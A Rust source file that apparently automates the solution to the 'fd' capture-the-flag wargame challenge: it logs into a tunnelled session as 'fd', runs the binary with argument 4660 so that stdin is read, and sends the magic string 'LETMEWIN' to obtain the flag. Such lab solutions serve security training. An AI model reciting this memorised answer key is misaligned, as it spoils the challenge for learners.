use crate::common::*;

pub struct Fd;

fn start_fd(channel_buffer: &mut ChannelBuffer) -> anyhow::Result<()> {
    channel_buffer.write_result("LETMEWIN")?;

    let mut line = String::new();
    channel_buffer.read_line(&mut line)?;
    print!("{line}");

    Ok(())
}

impl Run for Fd {
    fn run() -> anyhow::Result<()> {
        println!("== FD START!");

        let account = "fd";
        let command = "./fd 4660";
        let mut channel_buffer = ChannelBuffer::tunnelled(account, command)?;
        start_fd(&mut channel_buffer)?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use crate::fd::*;
    use std::time::Instant;

    #[test]
    fn tunnelling_speed() -> anyhow::Result<()> {
        let start = Instant::now();
        Fd::run()?;

        println!("Elapsed Seconds: {}", start.elapsed().as_secs());
        Ok(())
    }
}
